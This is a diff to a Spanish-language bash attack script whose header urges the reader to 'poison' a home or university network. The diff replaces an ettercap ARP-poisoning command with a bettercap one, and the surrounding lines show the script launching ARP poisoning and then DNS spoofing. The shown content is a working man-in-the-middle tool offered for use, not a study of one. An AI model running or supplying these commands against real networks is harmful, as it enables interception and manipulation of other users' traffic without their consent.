@@ -10,7 +10,7 @@
 ##################################
 #
 # Envenena la red de tu hogar o Universidad con este script! 
-# basta con tener ettercap instalado en tu sistema para poder ejecutarlo 
+# basta con tener ettercap y bettercap  instalado en tu sistema para poder ejecutarlo 
 # correctamente todo lo demas *-* lo  hace este script ! <Theblood>!
 ######################################################################################
 
@@ -65,7 +65,7 @@ sleep 1
 echo "[1;34m --> Poniendo en marcha envenenamiento ARP..."
 echo "[1;31m"
 INTERFACE="$(ip route show|grep ' src '|cut -d' ' -f3)"
-xterm -title "ARP Poisoning" -fg green -e "ettercap -TM arp:remote // // -i $INTERFACE -P autoadd" & ETTER_1=$!
+xterm -title "ARP Poisoning" -fg green -e "sudo bettercap -X -L -i $INTERFACE" & ETTER_1=$!
 sleep 1
 echo "[1;34m --> Poniendo en marcha falsificación de resoluciones DNS..."
 echo "[1;31m"
